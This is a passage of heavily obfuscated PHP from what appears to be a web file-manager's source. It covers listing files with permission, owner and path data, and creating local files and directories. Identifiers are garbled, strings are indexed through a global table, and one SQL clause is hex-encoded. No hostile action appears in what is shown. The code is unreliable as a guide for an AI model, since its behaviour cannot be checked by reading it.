Model($ª˜õ„ Æ[549])->listData(); $µÎÔ¾ß¢ = Model($ª˜õ„ Æ[499])->listData(); $¯Í™¦ç¾ = Model($ª˜õ„ Æ[489])->listData(); $ãİô‚Ê³ = Model($ª˜õ„ Æ[550])->listSimple(); $•Ë•Æ•Õ = array_to_keyvalue($ª­ØËÙÕ, $ª˜õ„ Æ[475]); $­Íö¢‹ = array_to_keyvalue_group($µÎÔ¾ß¢, $ª˜õ„ Æ[87], $ª˜õ„ Æ[500]); $˜³îÆúÑ = array_to_keyvalue($¯Í™¦ç¾, $ª˜õ„ Æ[87]); $Œˆ¡ÂÁö = array_to_keyvalue_group($ãİô‚Ê³, $ª˜õ„ Æ[193]); foreach ($ë¹ÈÄ¦­ as &$ëÊä“²³) { $ëÊä“²³[$ª˜õ„ Æ[90]] = array($ª˜õ„ Æ[551] => 0, $ª˜õ„ Æ[552] => 0, $ª˜õ„ Æ[553] => 0); if (isset($˜³îÆúÑ[$ëÊä“²³[$ª˜õ„ Æ[193]]])) { $ëÊä“²³[$ª˜õ„ Æ[90]][$ª˜õ„ Æ[554]] = 1; $ëÊä“²³[$ª˜õ„ Æ[90]][$ª˜õ„ Æ[555]] = $˜³îÆúÑ[$ëÊä“²³[$ª˜õ„ Æ[193]]][$ª˜õ„ Æ[32]]; } if ($­Íö¢‹ && $•Ë•Æ•Õ && isset($­Íö¢‹[$ëÊä“²³[$ª˜õ„ Æ[193]]])) { $ëÊä“²³[$ª˜õ„ Æ[90]][$ª˜õ„ Æ[556]] = array(); foreach ($­Íö¢‹[$ëÊä“²³[$ª˜õ„ Æ[193]]] as $˜—–”šÁ) { $Êªà¶Ş´ = $•Ë•Æ•Õ[$˜—–”šÁ]; $ëÊä“²³[$ª˜õ„ Æ[90]][$ª˜õ„ Æ[556]][] = array($ª˜õ„ Æ[557] => $Êªà¶Ş´[$ª˜õ„ Æ[475]], $ª˜õ„ Æ[494] => $Êªà¶Ş´[$ª˜õ„ Æ[32]], $ª˜õ„ Æ[558] => $Êªà¶Ş´[$ª˜õ„ Æ[559]]); } } if ($Œˆ¡ÂÁö && isset($Œˆ¡ÂÁö[$ëÊä“²³[$ª˜õ„ Æ[193]]])) { $ëÊä“²³[$ª˜õ„ Æ[90]][$ª˜õ„ Æ[560]] = array(); foreach ($Œˆ¡ÂÁö[$ëÊä“²³[$ª˜õ„ Æ[193]]] as $Ş«â®Ï³) { $¢Æ”‰Œ… = $ª˜õ„ Æ[561]; if ($Ş«â®Ï³[$ª˜õ„ Æ[562]] == $ª˜õ„ Æ[91]) { $¢Æ”‰Œ… .= $ª˜õ„ Æ[563]; } $ëÊä“²³[$ª˜õ„ Æ[90]][$ª˜õ„ Æ[560]] = array_field_key($Ş«â®Ï³, explode($ª˜õ„ Æ[50], $¢Æ”‰Œ…)); } } } unset($ëÊä“²³); return $ë¹ÈÄ¦­; } protected function _listAppendChildren(&$‡©›Œúî, $‚ŒÒÕ›š) { $»ˆ¸ÌÇ½ =& $_SERVER[¢ñàß¿€]; $š—©Ê÷ = array(); $¤Ô‘ŠŞÍ = array($»ˆ¸ÌÇ½[239] => 0, $»ˆ¸ÌÇ½[240] => 0); foreach ($‡©›Œúî as &$é¨Ö¸§É) { if (!$é¨Ö¸§É[$»ˆ¸ÌÇ½[485]]) { continue; } $š—©Ê÷[] = $é¨Ö¸§É[$»ˆ¸ÌÇ½[193]]; } unset($é¨Ö¸§É); if (!$š—©Ê÷) { return; } $óÕ€ë£“ = array($»ˆ¸ÌÇ½[192] => array($»ˆ¸ÌÇ½[7], $š—©Ê÷), $»ˆ¸ÌÇ½[505] => 0); $¥œ„”» = array($»ˆ¸ÌÇ½[192], $»ˆ¸ÌÇ½[485], $»ˆ¸ÌÇ½[564] => $»ˆ¸ÌÇ½[565]); $º¸æŞšÛ = $this->field($¥œ„”»)->where($óÕ€ë£“)->group($»ˆ¸ÌÇ½[566])->select(); $ƒóæÉ¾Í = array(); foreach ($º¸æŞšÛ as $Å§§¥áÍ) { $Î­Ø‰Ñ¢ = $Å§§¥áÍ[$»ˆ¸ÌÇ½[192]]; $Úºø‚ÈÁ = $Å§§¥áÍ[$»ˆ¸ÌÇ½[485]] == $»ˆ¸ÌÇ½[91] ? $»ˆ¸ÌÇ½[240] : $»ˆ¸ÌÇ½[239]; if (!isset($ƒóæÉ¾Í[$Î­Ø‰Ñ¢])) { $ƒóæÉ¾Í[$Î­Ø‰Ñ¢] = array($»ˆ¸ÌÇ½[239] => 0, $»ˆ¸ÌÇ½[240] => 0); } $ƒóæÉ¾Í[$Î­Ø‰Ñ¢][$Úºø‚ÈÁ] += $Å§§¥áÍ[$»ˆ¸ÌÇ½[565]]; } foreach ($‡©›Œúî as &$é¨Ö¸§É) { if (!$é¨Ö¸§É[$»ˆ¸ÌÇ½[485]]) { continue; } $ÀµÎ­ùÂ = is_array($ƒóæÉ¾Í[$é¨Ö¸§É[$»ˆ¸ÌÇ½[193]]]) ? $ƒóæÉ¾Í[$é¨Ö¸§É[$»ˆ¸ÌÇ½[193]]] : $¤Ô‘ŠŞÍ; $é¨Ö¸§É[$»ˆ¸ÌÇ½[240]] = $ÀµÎ­ùÂ[$»ˆ¸ÌÇ½[240]]; $é¨Ö¸§É[$»ˆ¸ÌÇ½[239]] = $ÀµÎ­ùÂ[$»ˆ¸ÌÇ½[239]]; unset($é¨Ö¸§É[$»ˆ¸ÌÇ½[486]]); } unset($é¨Ö¸§É); } protected function _listAppendAuth(&$¼Æı¢Ì¡) { $‘‰¥Çªó =& $_SERVER[¢ñàß¿€]; $•í‡…Ô­ = array(); foreach ($¼Æı¢Ì¡ as $§íÀÌê) { if ($§íÀÌê[$‘‰¥Çªó[190]] == self::TYPE_GROUP) { $•í‡…Ô­[] = $§íÀÌê[$‘‰¥Çªó[193]]; } } if (!$•í‡…Ô­) { return; } $õÇ­Å÷è = array_to_keyvalue($¼Æı¢Ì¡, $‘‰¥Çªó[193]); $Ñ‘„ù = Model($‘‰¥Çªó[567])->getSourceList($•í‡…Ô­, $õÇ­Å÷è); $Ùáª­û = KodUser::isRoot(); foreach ($¼Æı¢Ì¡ as $Ì»ÇÖï© => &$§íÀÌê) { $§íÀÌê[$‘‰¥Çªó[487]] = $Ñ‘„ù[$§íÀÌê[$‘‰¥Çªó[193]]]; if (!$§íÀÌê[$‘‰¥Çªó[487]] && $§íÀÌê[$‘‰¥Çªó[190]] == self::TYPE_GROUP) { $§íÀÌê[$‘‰¥Çªó[487]] = Action($‘‰¥Çªó[568])->pathGroupAuthMake($§íÀÌê[$‘‰¥Çªó[569]]); if (!$§íÀÌê[$‘‰¥Çªó[487]] && !$Ùáª­û) { $§íÀÌê[$‘‰¥Çªó[233]] = !1; $§íÀÌê[$‘‰¥Çªó[232]] = !1; } } if ($§íÀÌê[$‘‰¥Çªó[487]]) { $§íÀÌê[$‘‰¥Çªó[233]] = AuthModel::authCheckEdit($§íÀÌê[$‘‰¥Çªó[487]][$‘‰¥Çªó[488]]); $§íÀÌê[$‘‰¥Çªó[232]] = AuthModel::authCheckView($§íÀÌê[$‘‰¥Çªó[487]][$‘‰¥Çªó[488]]); } $this->groupPathDisplay($§íÀÌê); } unset($§íÀÌê); } public function _listAppendAuthSecret(&$îä¯İ) { $…å†Æ©¥ =& $_SERVER[¢ñàß¿€]; if (Model($…å†Æ©¥[508])->get($…å†Æ©¥[570]) != $…å†Æ©¥[91]) { return; } static $ƒµÃ”®Ü = false; if (!$ƒµÃ”®Ü) { $‡À©ê´” = Model($…å†Æ©¥[571]); $æëÈ“‡ã = Model($…å†Æ©¥[572]); $ƒµÃ”®Ü = $æëÈ“‡ã->listData(); $ƒµÃ”®Ü = array_to_keyvalue($ƒµÃ”®Ü, $…å†Æ©¥[193]); $ë®İî‰¶ = json_decode(Model($…å†Æ©¥[508])->get($…å†Æ©¥[573]), !0); $ë®İî‰¶ = array_to_keyvalue($ë®İî‰¶, $…å†Æ©¥[475]); foreach ($ƒµÃ”®Ü as $¨ÓËÀÃ¸ => $ôş­º¶) { $Ó¥Ëû = $ë®İî‰¶[$ôş­º¶[$…å†Æ©¥[574]]]; if (!$Ó¥Ëû) { $æëÈ“‡ã->remove($ôş­º¶[$…å†Æ©¥[475]]); unset($ƒµÃ”®Ü[$¨ÓËÀÃ¸]); continue; } $¡ÊòËŞ = $‡À©ê´”->listData($Ó¥Ëû[$…å†Æ©¥[487]]); if (!$¡ÊòËŞ) { $æëÈ“‡ã->remove($ôş­º¶[$…å†Æ©¥[475]]); unset($ƒµÃ”®Ü[$¨ÓËÀÃ¸]); continue; } $ôş­º¶[$…å†Æ©¥[487]] = $¡ÊòËŞ; $ôş­º¶[$…å†Æ©¥[575]] = $Ó¥Ëû; $ôş­º¶[$…å†Æ©¥[576]] = Model($…å†Æ©¥[577])->getInfoSimpleOuter($ôş­º¶[$…å†Æ©¥[527]]); $ƒµÃ”®Ü[$¨ÓËÀÃ¸] = $ôş­º¶; } } $¡–’÷Õ = USER_ID; $¸‘ªÉ³É = array(); $…­ÕÒ € = $this->_listAppendPath($¸‘ªÉ³É, !0); foreach ($îä¯İ as $¨ÓËÀÃ¸ => &$ôş­º¶) { if (!is_array($ôş­º¶[$…å†Æ©¥[487]])) { continue; } if ($ôş­º¶[$…å†Æ©¥[190]] != $…å†Æ©¥[578]) { continue; } if (isset($ƒµÃ”®Ü[$ôş­º¶[$…å†Æ©¥[193]]])) { $„Ô¨Êñ = $ƒµÃ”®Ü[$ôş­º¶[$…å†Æ©¥[193]]]; if (!is_array($ôş­º¶[$…å†Æ©¥[539]])) { $ôş­º¶[$…å†Æ©¥[539]] = array(); } $ôş­º¶[$…å†Æ©¥[539]][$…å†Æ©¥[579]] = $„Ô¨Êñ[$…å†Æ©¥[574]]; $ôş­º¶[$…å†Æ©¥[487]][$…å†Æ©¥[580]] = $„Ô¨Êñ; $ôş­º¶[$…å†Æ©¥[487]][$…å†Æ©¥[581]] = $ôş­º¶[$…å†Æ©¥[582]]; $ôş­º¶[$…å†Æ©¥[487]][$…å†Æ©¥[583]] = $…å†Æ©¥[91]; if ($„Ô¨Êñ[$…å†Æ©¥[527]] != $¡–’÷Õ) { $ôş­º¶[$…å†Æ©¥[487]][$…å†Æ©¥[488]] = $ôş­º¶[$…å†Æ©¥[487]][$…å†Æ©¥[488]] & $„Ô¨Êñ[$…å†Æ©¥[487]][$…å†Æ©¥[487]]; } continue; } $»Şå¿çÁ = $this->parentLevelArray($ôş­º¶[$…å†Æ©¥[584]]); $ï»¯§± = array_reverse($»Şå¿çÁ); foreach ($ï»¯§± as $Ÿ³Ş‰íÕ => $Ÿæï²ôü) { if (!isset($ƒµÃ”®Ü[$Ÿæï²ôü])) { continue; } $„Ô¨Êñ = $ƒµÃ”®Ü[$Ÿæï²ôü]; $ôş­º¶[$…å†Æ©¥[487]][$…å†Æ©¥[580]] = $„Ô¨Êñ; if ($„Ô¨Êñ[$…å†Æ©¥[527]] != $¡–’÷Õ) { $ôş­º¶[$…å†Æ©¥[487]][$…å†Æ©¥[488]] = $ôş­º¶[$…å†Æ©¥[487]][$…å†Æ©¥[488]] & $„Ô¨Êñ[$…å†Æ©¥[487]][$…å†Æ©¥[487]]; } $¯Ûªüˆ‘ = $…å†Æ©¥[12]; $Ñ™Á‘÷¡ = count($»Şå¿çÁ) - $Ÿ³Ş‰íÕ; for ($ïÙó•Š® = 0; $ïÙó•Š® < $Ñ™Á‘÷¡; $ïÙó•Š®++) { if (!isset($…­ÕÒ €[$»Şå¿çÁ[$ïÙó•Š®]])) { $¯Ûªüˆ‘ = $…å†Æ©¥[12]; break; } $¯Ûªüˆ‘ = $¯Ûªüˆ‘ . rtrim($…­ÕÒ €[$»Şå¿çÁ[$ïÙó•Š®]], $…å†Æ©¥[8]) . $…å†Æ©¥[8]; } $ôş­º¶[$…å†Æ©¥[487]][$…å†Æ©¥[581]] = rtrim($¯Ûªüˆ‘, $…å†Æ©¥[8]) . $…å†Æ©¥[8]; break; } } unset($ôş­º¶); } public function groupPathDisplay(&$ó¨ö»öË) { $Ú‡à¨¶Í =& $_SERVER[¢ñàß¿€]; if ($ó¨ö»öË[$Ú‡à¨¶Í[190]] != self::TYPE_GROUP) { return; } $ıÜ¾âáÜ = Model($Ú‡à¨¶Í[585])->getInfo($ó¨ö»öË[$Ú‡à¨¶Í[569]]); $®ØÆÀÍÌ = $this->parentLevelArray($ıÜ¾âáÜ[$Ú‡à¨¶Í[584]]); $Ü÷÷ôÛ• = $Ú‡à¨¶Í[12]; foreach ($®ØÆÀÍÌ as $Ä¶âÙ¾Ú) { $®ÚşÇ˜ = Model($Ú‡à¨¶Í[585])->getInfo($Ä¶âÙ¾Ú); $Ü÷÷ôÛ• .= $®ÚşÇ˜[$Ú‡à¨¶Í[90]][$Ú‡à¨¶Í[193]] . $Ú‡à¨¶Í[50]; } $ó¨ö»öË[$Ú‡à¨¶Í[586]] = $ıÜ¾âáÜ[$Ú‡à¨¶Í[192]]; $ó¨ö»öË[$Ú‡à¨¶Í[587]] = $ıÜ¾âáÜ[$Ú‡à¨¶Í[584]]; $ó¨ö»öË[$Ú‡à¨¶Í[588]] = $ıÜ¾âáÜ[$Ú‡à¨¶Í[589]]; $ó¨ö»öË[$Ú‡à¨¶Í[590]] = $Ü÷÷ôÛ• . $ıÜ¾âáÜ[$Ú‡à¨¶Í[90]][$Ú‡à¨¶Í[193]]; } protected function _listAppendPath(&$ßó¡Ï£, $üÄÃ¼—ô = false) { $Šõùà“ =& $_SERVER[¢ñàß¿€]; static $°ÔîÉà¨ = array(); $ºíæ¹ß = array(); $¶‘Óç…Î = array(); if ($üÄÃ¼—ô) { return $°ÔîÉà¨; } foreach ($ßó¡Ï£ as &$â†¦ùŒ) { $œıë–İÑ = $â†¦ùŒ[$Šõùà“[193]]; if ($â†¦ùŒ[$Šõùà“[485]] == $Šõùà“[91] && $â†¦ùŒ[$Šõùà“[192]] != 0) { $°ÔîÉà¨[$œıë–İÑ] = $â†¦ùŒ[$Šõùà“[32]]; } if ($â†¦ùŒ[$Šõùà“[485]] == $Šõùà“[91] && $â†¦ùŒ[$Šõùà“[192]] == 0) { $°ÔîÉà¨[$œıë–İÑ] = $this->_listAppendPathRoot($â†¦ùŒ, array()); } if (isset($¶‘Óç…Î[$â†¦ùŒ[$Šõùà“[584]]])) { continue; } $¶‘Óç…Î[$â†¦ùŒ[$Šõùà“[584]]] = !0; $å¯«…‚õ = $this->parentLevelArray($â†¦ùŒ[$Šõùà“[584]]); foreach ($å¯«…‚õ as $‹Óü‡Ì => $‚Éƒªµî) { if (isset($°ÔîÉà¨[$‚Éƒªµî])) { continue; } if ($‹Óü‡Ì == 0) { $°ÔîÉà¨[$‚Éƒªµî] = $this->_listAppendPathRoot($â†¦ùŒ, $å¯«…‚õ); } if ($‹Óü‡Ì != 0) { $ºíæ¹ß[] = $‚Éƒªµî; } } } unset($â†¦ùŒ); $ºíæ¹ß = array_unique($ºíæ¹ß); if (count($ºíæ¹ß) > 0) { $›êĞ§´è = array($Šõùà“[491] => array($Šõùà“[492], $ºíæ¹ß)); if (count($ºíæ¹ß) == 1) { $¼‡¥±Û = $this->sourceInfo($ºíæ¹ß[0]); $«èÒÔÛ¬ = is_array($¼‡¥±Û) ? array($¼‡¥±Û) : !1; } else { $«èÒÔÛ¬ = $this->field($Šõùà“[591])->where($›êĞ§´è)->select(); } if (!$«èÒÔÛ¬) { $«èÒÔÛ¬ = array(); } foreach ($«èÒÔÛ¬ as $¨¢õ²šè) { $°ÔîÉà¨[$¨¢õ²šè[$Šõùà“[193]]] = $¨¢õ²šè[$Šõùà“[32]]; } } $â±à´ŠÛ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¥¾æ½Ì = array(); foreach ($ßó¡Ï£ as &$â†¦ùŒ) { $ƒ€«•¦” = $â†¦ùŒ[$Šõùà“[584]]; $¯Éù‚±„ = $Šõùà“[12]; if (isset($¥¾æ½Ì[$ƒ€«•¦”])) { $¯Éù‚±„ = $¥¾æ½Ì[$ƒ€«•¦”]; } else { $å¯«…‚õ = $this->parentLevelArray($â†¦ùŒ[$Šõùà“[584]]); foreach ($å¯«…‚õ as $‹Óü‡Ì => $‚Éƒªµî) { if (isset($°ÔîÉà¨[$‚Éƒªµî])) { $¯Éù‚±„ .= $°ÔîÉà¨[$‚Éƒªµî] . $Šõùà“[8]; } } $¥¾æ½Ì[$ƒ€«•¦”] = $¯Éù‚±„; } $¯Éù‚±„ .= $â†¦ùŒ[$Šõùà“[32]]; if ($â†¦ùŒ[$Šõùà“[485]] == $Šõùà“[91]) { $¯Éù‚±„ .= $Šõùà“[8]; } $â†¦ùŒ[$Šõùà“[582]] = str_replace($Šõùà“[592], $Šõùà“[8], $¯Éù‚±„); if ($â†¦ùŒ[$Šõùà“[192]] == $Šõùà“[228]) { $â†¦ùŒ[$Šõùà“[32]] = trim($°ÔîÉà¨[$â†¦ùŒ[$Šõùà“[193]]], $Šõùà“[8]); $â†¦ùŒ[$Šõùà“[582]] = $â†¦ùŒ[$Šõùà“[32]] . $Šõùà“[8]; } if (intval($â†¦ùŒ[$Šõùà“[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($â†¦ùŒ, $å¯«…‚õ, $â±à´ŠÛ); } } unset($â†¦ùŒ); return $ßó¡Ï£; } private function _listAppendPathRecycle(&$®•Ï¼¿¾, $¹¤ƒ¦ß, $ô˜Š÷Ù) { $®Ú¼çĞÊ =& $_SERVER[¢ñàß¿€]; if (!in_array($ô˜Š÷Ù, $¹¤ƒ¦ß) && $®•Ï¼¿¾[$®Ú¼çĞÊ[193]] != $ô˜Š÷Ù) { return; } $¢Òçš£â = explode($®Ú¼çĞÊ[8], trim($®•Ï¼¿¾[$®Ú¼çĞÊ[582]], $®Ú¼çĞÊ[8])); $†«ò§ú = implode($®Ú¼çĞÊ[8], array_slice($¢Òçš£â, 2)); $®•Ï¼¿¾[$®Ú¼çĞÊ[582]] = $®Ú¼çĞÊ[8] . LNG($®Ú¼çĞÊ[593]) . $®Ú¼çĞÊ[8] . ltrim($†«ò§ú, $®Ú¼çĞÊ[8]); $®•Ï¼¿¾[$®Ú¼çĞÊ[584]] = $®Ú¼çĞÊ[594] . implode($®Ú¼çĞÊ[50], array_slice($¹¤ƒ¦ß, 1)) . $®Ú¼çĞÊ[50]; if ($®•Ï¼¿¾[$®Ú¼çĞÊ[193]] == $ô˜Š÷Ù) { $®•Ï¼¿¾[$®Ú¼çĞÊ[584]] = $®Ú¼çĞÊ[594]; $®•Ï¼¿¾[$®Ú¼çĞÊ[192]] = $®Ú¼çĞÊ[228]; $®•Ï¼¿¾[$®Ú¼çĞÊ[32]] = LNG($®Ú¼çĞÊ[593]); } $®•Ï¼¿¾[$®Ú¼çĞÊ[595]] = $®Ú¼çĞÊ[596]; } protected function _listAppendPathRoot(&$«¶ÖÛ‘æ, $›Àôñ¯) { $¥¢šÔª¨ =& $_SERVER[¢ñàß¿€]; static $şÌÊ½‡ = false; $ÓéÕ²„‚ = $¥¢šÔª¨[12]; if ($«¶ÖÛ‘æ[$¥¢šÔª¨[190]] == self::TYPE_USER) { if ($«¶ÖÛ‘æ[$¥¢šÔª¨[569]] == USER_ID) { $ÓéÕ²„‚ = LNG($¥¢šÔª¨[597]); if ($şÌÊ½‡ === !1) { $ã‡ò¦‚¬ = Model($¥¢šÔª¨[598])->getInfoFull(USER_ID); $şÌÊ½‡ = _get($ã‡ò¦‚¬, $¥¢šÔª¨[599], $¥¢šÔª¨[12]); } if ($›Àôñ¯ && $›Àôñ¯[0] == $şÌÊ½‡ || !$›Àôñ¯ && $«¶ÖÛ‘æ[$¥¢šÔª¨[193]] == $şÌÊ½‡) { $ÓéÕ²„‚ = LNG($¥¢šÔª¨[600]); $«¶ÖÛ‘æ[$¥¢šÔª¨[601]] = $¥¢šÔª¨[602]; } if (!$›Àôñ¯) { $«¶ÖÛ‘æ[$¥¢šÔª¨[32]] = $ÓéÕ²„‚; } } else { $«¶ÖÛ‘æ[$¥¢šÔª¨[603]] = Model($¥¢šÔª¨[577])->getInfoSimpleOuter($«¶ÖÛ‘æ[$¥¢šÔª¨[569]]); $ÓéÕ²„‚ = LNG($¥¢šÔª¨[604]) . $¥¢šÔª¨[176] . $«¶ÖÛ‘æ[$¥¢šÔª¨[603]][$¥¢šÔª¨[32]] . $¥¢šÔª¨[178]; } } else { if ($«¶ÖÛ‘æ[$¥¢šÔª¨[190]] == self::TYPE_GROUP) { $Ÿìòı‡ª = Model($¥¢šÔª¨[585])->getInfoSimple($«¶ÖÛ‘æ[$¥¢šÔª¨[569]]); $ÓéÕ²„‚ = $Ÿìòı‡ª[$¥¢šÔª¨[32]]; } else { if ($«¶ÖÛ‘æ[$¥¢šÔª¨[190]] == self::TYPE_SYSTEM) { $ÓéÕ²„‚ = $¥¢šÔª¨[605]; } } } $ÓéÕ²„‚ = $ÓéÕ²„‚ ? $¥¢šÔª¨[8] . $ÓéÕ²„‚ . $¥¢šÔª¨[8] : $¥¢šÔª¨[8]; return $ÓéÕ²„‚; } protected function _listAppendUser(&$´”ü£Æ) { $°ˆµÎ±Ò =& $_SERVER[¢ñàß¿€]; $““Ë€“Œ = array_to_keyvalue($´”ü£Æ, $°ˆµÎ±Ò[12], $°ˆµÎ±Ò[527]); $î‘¹šë‹ = array_to_keyvalue($´”ü£Æ, $°ˆµÎ±Ò[12], $°ˆµÎ±Ò[529]); $Ì³Àºíé = array_merge($““Ë€“Œ, $î‘¹šë‹); $²ÜŸé› = Model($°ˆµÎ±Ò[598])->userListInfo($Ì³Àºíé); foreach ($´”ü£Æ as &$ŠñÒşûË) { $şÓ²Ë¸  = $ŠñÒşûË[$°ˆµÎ±Ò[527]]; $ŠñÒşûË[$°ˆµÎ±Ò[527]] = $²ÜŸé›[$şÓ²Ë¸ ] ? $²ÜŸé›[$şÓ²Ë¸ ] : !1; $şÓ²Ë¸  = $ŠñÒşûË[$°ˆµÎ±Ò[529]]; $ŠñÒşûË[$°ˆµÎ±Ò[529]] = $²ÜŸé›[$şÓ²Ë¸ ] ? $²ÜŸé›[$şÓ²Ë¸ ] : !1; if (_get($ŠñÒşûË, $°ˆµÎ±Ò[606], 0)) { $ïˆ¨÷ÀÍ = $GLOBALS[$°ˆµÎ±Ò[6]][$°ˆµÎ±Ò[92]][$°ˆµÎ±Ò[607]]; if ($ŠñÒşûË[$°ˆµÎ±Ò[539]][$°ˆµÎ±Ò[608]] <= time() - $ïˆ¨÷ÀÍ) { $this->metaSet($ŠñÒşûË[$°ˆµÎ±Ò[193]], $°ˆµÎ±Ò[609], null); $this->metaSet($ŠñÒşûË[$°ˆµÎ±Ò[193]], $°ˆµÎ±Ò[608], null); unset($ŠñÒşûË[$°ˆµÎ±Ò[539]][$°ˆµÎ±Ò[609]]); continue; } $Œş„ëäë = $ŠñÒşûË[$°ˆµÎ±Ò[539]][$°ˆµÎ±Ò[609]]; $ŠñÒşûË[$°ˆµÎ±Ò[539]][$°ˆµÎ±Ò[610]] = Model($°ˆµÎ±Ò[598])->getInfoSimpleOuter($Œş„ëäë); } } unset($ŠñÒşûË); } public function parentLevelArray($ŸõÒ¯’Ã) { $®›×öÂ¯ =& $_SERVER[¢ñàß¿€]; $ŸõÒ¯’Ã = explode($®›×öÂ¯[50], trim($ŸõÒ¯’Ã, $®›×öÂ¯[50])); return array_remove_value($ŸõÒ¯’Ã, $®›×öÂ¯[228]); } public function listAll($ùÀ³‘µ) { $¬ÌãÅ‘ =& $_SERVER[¢ñàß¿€]; $ûôˆ‡ã® = $this->sourceInfo($ùÀ³‘µ); $¡‚ÁÛ»û = array($¬ÌãÅ‘[611] => array($¬ÌãÅ‘[612], $ûôˆ‡ã®[$¬ÌãÅ‘[584]] . $ùÀ³‘µ . $¬ÌãÅ‘[613]), $¬ÌãÅ‘[614] => 0); $¥şÛ§Ãƒ = $¬ÌãÅ‘[615]; $À­ì¶ı = "\114\x45\x46\124\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\151\x6f\x5f\x66\151\x6c\145\40\146\x69\x6c\145\x20\157\156\x20\163\x6f\165\x72\x63\145\56\146\151\x6c\x65\111\104\40\x3d\40\146\151\154\145\x2e\146\151\x6c\145\111\x44"; $Ä°¿“Š = $this->alias($¬ÌãÅ‘[519])->field($¥şÛ§Ãƒ)->where($¡‚ÁÛ»û)->join($À­ì¶ı)->select(); $this->_listAppendAuth($Ä°¿“Š); $this->_listAppendUser($Ä°¿“Š); $this->_listAppendPath($Ä°¿“Š); $Ä°¿“Š = array_to_keyvalue($Ä°¿“Š, $¬ÌãÅ‘[193]); $´üåÑæ = "\x2f{$ûôˆ‡ã®[$¬ÌãÅ‘[32]]}\x2f"; $´üåÑæ = $´üåÑæ == $¬ÌãÅ‘[592] ? $¬ÌãÅ‘[8] : $´üåÑæ; $œ«ø¯ı = array(); foreach ($Ä°¿“Š as $×·‹ïüé => $¿¦÷–½¦) { $Â’¾¥ÂÇ = $this->parentLevelArray($¿¦÷–½¦[$¬ÌãÅ‘[584]]); array_shift($Â’¾¥ÂÇ); $É‡èåõ = $´üåÑæ; for ($£®Œò¶ = 0; $£®Œò¶ < count($Â’¾¥ÂÇ); $£®Œò¶++) { $É‡èåõ .= $Ä°¿“Š[$Â’¾¥ÂÇ[$£®Œò¶]][$¬ÌãÅ‘[32]] . $¬ÌãÅ‘[8]; } $É‡èåõ .= $¿¦÷–½¦[$¬ÌãÅ‘[32]]; if ($¿¦÷–½¦[$¬ÌãÅ‘[485]]) { $É‡èåõ .= $¬ÌãÅ‘[8]; } $«‡ô‰œÆ = array($¬ÌãÅ‘[495] => str_replace($¬ÌãÅ‘[592], $¬ÌãÅ‘[8], str_replace($¬ÌãÅ‘[592], $¬ÌãÅ‘[8], str_replace($¬ÌãÅ‘[592], $¬ÌãÅ‘[8], $É‡èåõ))), $¬ÌãÅ‘[616] => intval($¿¦÷–½¦[$¬ÌãÅ‘[485]]), $¬ÌãÅ‘[617] => intval($¿¦÷–½¦[$¬ÌãÅ‘[79]]), $¬ÌãÅ‘[88] => intval($¿¦÷–½¦[$¬ÌãÅ‘[88]]), $¬ÌãÅ‘[90] => $this->pathInfoFilter($¿¦÷–½¦)); if (!$«‡ô‰œÆ[$¬ÌãÅ‘[485]]) { $«‡ô‰œÆ[$¬ÌãÅ‘[541]] = $¿¦÷–½¦[$¬ÌãÅ‘[541]]; } $œ«ø¯ı[] = $«‡ô‰œÆ; } $œ«ø¯ı = array_sort_by($œ«ø¯ı, $¬ÌãÅ‘[87]); return $œ«ø¯ı; } } goto E¹å£¹ĞÃ; Fª‚ÄÖÒ½: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($æœúíÓã) { if (substr($æœúíÓã, 0, 2) == $_SERVER[¢ñàß¿€][1435]) { $æœúíÓã = BASIC_PATH . substr($æœúíÓã, 2); } return $æœúíÓã; } public function iconvApp($ŸÄãÕÚû) { $…º†Äí  =& $_SERVER[¢ñàß¿€]; global $config; return $this->iconvTo($ŸÄãÕÚû, $config[$…º†Äí [1433]], $config[$…º†Äí [1432]]); } public function iconvSystem($¦¤Ë¥í‡) { $Í÷¢¤¨Ç =& $_SERVER[¢ñàß¿€]; global $config; return $this->iconvTo($¦¤Ë¥í‡, $config[$Í÷¢¤¨Ç[1432]], $config[$Í÷¢¤¨Ç[1433]]); } public function getPathOuter($“û“ù‚Ì) { $ªôè‚ É =& $_SERVER[¢ñàß¿€]; $±îß¶õ = $this->iconvApp($this->pathBase); $“û“ù‚Ì = $this->iconvApp($“û“ù‚Ì); if (substr($±îß¶õ, 0, 2) == $ªôè‚ É[1435]) { $±îß¶õ = BASIC_PATH . substr($±îß¶õ, 2); } if (substr($“û“ù‚Ì, 0, 2) == $ªôè‚ É[1435]) { $“û“ù‚Ì = BASIC_PATH . substr($“û“ù‚Ì, 2); } $±îß¶õ = KodIO::clear($±îß¶õ); $“û“ù‚Ì = KodIO::clear($“û“ù‚Ì); $“û“ù‚Ì = substr($“û“ù‚Ì, strlen($±îß¶õ)); if (empty($this->pathDriver)) { return $“û“ù‚Ì; } return $this->pathDriver . $ªôè‚ É[8] . ltrim($“û“ù‚Ì, $ªôè‚ É[8]); } public function mkfile($å¯ÀŞ£ö, $“‘áŸµ = '', $ĞŠÛÁš‘ = REPEAT_RENAME) { $å¯ÀŞ£ö = $this->iconvSystem($å¯ÀŞ£ö); @touch($å¯ÀŞ£ö); if ($“‘áŸµ) { file_put_contents($å¯ÀŞ£ö, $“‘áŸµ); } @chmod($å¯ÀŞ£ö, $this->pathAuth); if (is_file($å¯ÀŞ£ö)) { return $this->getPathOuter($å¯ÀŞ£ö); } $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][1445], !0); return !1; } public function mkdir($ïÓÏö¸Ä, $²Ç¢”‹ = REPEAT_SKIP) { $ïÓÏö¸Ä = $this->iconvSystem($ïÓÏö¸Ä); if (is_dir($ïÓÏö¸Ä)) { return $this->getPathOuter($ïÓÏö¸Ä); } if (!$this->mkdir($this->pathFather($ïÓÏö¸Ä))) { return !1; } @mkdir($ïÓÏö¸Ä, $this->pathAuth, !0); @chmod($ïÓÏö¸Ä, $this->pathAuth); if (is_dir($ïÓÏö¸Ä)) { return $this->getPathOuter($ïÓÏö¸Ä); } $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][1445], !0); return !1; } public function copyFile($‘÷ê–Ü©, $³šˆÏÒª) { $this->mkdir($this->pathFather($³šˆÏÒª)); $‘÷ê–Ü© = $this->iconvSystem($‘÷ê–Ü©); $³šˆÏÒª = $this->iconvSystem($³šˆÏÒª); 